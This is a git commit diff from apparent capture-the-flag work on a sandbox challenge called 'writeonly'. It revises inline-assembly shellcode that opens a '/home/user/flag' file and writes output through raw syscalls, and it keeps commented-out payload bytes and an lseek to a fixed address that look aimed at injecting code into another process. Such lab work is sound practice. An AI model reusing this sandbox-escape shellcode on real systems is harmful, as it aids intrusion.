5a194b8f2db16973b2932bcbfeee9ec53cf6fef5
Richard Connon <richard@connon.me.uk>
2020-08-23 16:28:18 +0100

    My Stuff

--- sandbox/writeonly/shellcode.c
+++ sandbox/writeonly/shellcode.c
@@ -5,125 +5,59 @@
 #include <sys/stat.h>
 #include <sched.h>
 void sc() {
-    uint32_t zero = 0;
-    uint32_t two = 2;
-    uint32_t four = 4;
-    uint32_t sixteen = 16;
-
+    uint32_t flag_fd = 0;
     uint32_t ret = 0;
-    uint32_t fd_1 = 1;
-    uint32_t pid_2 = 2;
     uint32_t err = 0;
 
-    uint32_t nocare = 0;
+    //char payload[] = {0x48,0x89,0xfe,0x48,0xc7,0xc0,0x28,0x00,0x00,0x00,0x48,0xc7,0xc7,0x01,0x00,0x00,0x00,0x48,0xc7,0xc2,0x00,0x00,0x00,0x00,0x49,0xc7,0xc2,0x12,0x00,0x00,0x00,0x0f,0x05};
+    char not_flag[] = "NOT_FLAG";
+    char mem_str[] = "/home/user/flag";
 
-    struct stat stat_out;
-
-    // push '/home/user/flag' to the stack
-    asm volatile (
-      "movabs %%rax, 0x0067616c662f7265\n\t"
-      "push %%rax\n\t"
-      "movabs %%rax, 0x73752f656d6f682f\n\t"
-      "push %%rax"
-      :
-      :
-      : "rax", "memory");
-    // write stack to fd_1 (stdout)
-    asm volatile (
-      "mov %%rsi, %%rsp\n\t"
-      "syscall"
-      : "=a"(ret), "=d"(err)
-      : "a"(__NR_write), "D"(fd_1), "d"(sixteen)
-      : "rsi", "memory");
-    // open fd for flag file
-    asm volatile (
-      "mov %%rdi, %%rsp\n\t"
-      "syscall"
-      : "=a"(ret), "=d"(err)
-      : "a"(__NR_open), "S"(zero), "d"(zero)
-      : "rdi", "rcx", "memory");
-
-    // push P * 16 to stack
-    asm volatile (
-      "pop %%rax\n\t"
-      "pop %%rax\n\t"
-      "movabs %%rax, 0x0050505050505050\n\t"
-      "push %%rax\n\t"
-      "movabs %%rax, 0x5050505050505050\n\t"
-      "push %%rax\n\t"
-      "movabs %%rax, 0x5050505050505050\n\t"
-      "push %%rax"
-      :
-      :
-      : "rax", "memory");
-
-    // clone
+    // write stack to stdout
     asm volatile (
       "syscall"
       : "=a"(ret)
-      : "a"(__NR_clone), "D"(CLONE_PARENT), "S"(0)
+      : "a"(__NR_write), "D"(1), "S"(mem_str), "d"(sizeof(mem_str))
       : "rcx", "memory");
 
-//    // write stack to fd_1
-//    asm volatile (
-//      "mov %%rsi, %%rsp\n\t"
-//      "syscall"
-//      :
-//      : "a"(__NR_read), "D"(3), "d"(sixteen)
-//      : "rsi", "rcx", "memory");
-
-    // write stack to fd_1
+    // open fd for flag file
     asm volatile (
-      "mov %%rsi, %%rsp\n\t"
       "syscall"
-      :
-      : "a"(__NR_write), "D"(fd_1), "d"(sixteen)
-      : "rsi", "rcx", "memory");
+      : "=a"(flag_fd)
+      : "a"(__NR_open), "D"(mem_str), "S"(0), "d"(0)
+      : "rcx", "memory");
 
-//    // fstat fd for flag file
-//    asm volatile (
-//      "syscall"
-//      : "=a"(ret), "=d"(err)
-//      : "a"(__NR_fstat), "D"(ret), "S"(&stat_out)
-//      : "rcx", "memory");
-//    // write size of flag file
+    // write ret to stdout
+    asm volatile (
+      "syscall"
+      : "=a"(ret)
+      : "a"(__NR_write), "D"(1), "S"(&flag_fd), "d"(sizeof(flag_fd))
+      : "rcx", "memory");
+
+    asm volatile (
+      "syscall"
+      : "=a"(ret)
+      : "a"(__NR_write), "D"(ret), "S"(not_flag), "d"(sizeof(not_flag))
+      : "rcx", "memory");
+
 //    asm volatile (
 //      "syscall"
 //      : "=a"(ret)
-//      : "a"(__NR_write), "D"(fd_1), "S"(&(stat_out.st_size)), "d"(sizeof(off_t))
+//      : "a"(__NR_lseek), "D"(ret), "S"(0x401b9d), "d"(SEEK_SET)
 //      : "rcx", "memory");
 
-
-
-//    asm volatile (
-//      "syscall"
-//      : "=a"(nocare)
-//      : "a"(__NR_write), "D"(fd_1), "S"(&ret), "d"(four)
-//      : "memory");
-//    asm volatile (
-//      "syscall"
-//      : "=a"(nocare)
-//      : "a"(__NR_write), "D"(fd_1), "S"(&err), "d"(four)
-//      : "memory");
-//    asm volatile (
-//      "syscall"
-//      :
-//      : "a"(__NR_write), "D"(fd_1), "S"(&err), "d"(4)
-//      : "memory");
-//    asm volatile (
-//      "syscall"
-//      : "=a"(nocare)
-//      : "a"(__NR_write), "D"(fd_1), "S"(&ret), "d"(4)
-//      : "memory");
-//    asm volatile (
-//      "syscall"
-//      : "=a"(nocare)
-//      : "a"(__NR_write), "D"(fd_1), "S"(&err), "d"(4)
-//      : "memory");
 //    asm volatile (
 //      "syscall"
 //      : "=a"(ret)
-//      : "a"(__NR_write), "D"(fd_1), "S"(&(stat_out.st_size)), "d"(sizeof(off_t))
-//      : "memory");
+//      : "a"(__NR_write), "D"(ret), "S"(payload), "d"(sizeof(payload))
+//      : "rcx", "memory");
+
+    while(1) {
+        asm volatile (
+          "syscall"
+          : "=a"(ret)
+          : "a"(__NR_sched_yield)
+          : "rcx", "memory");
+    }
 }
 
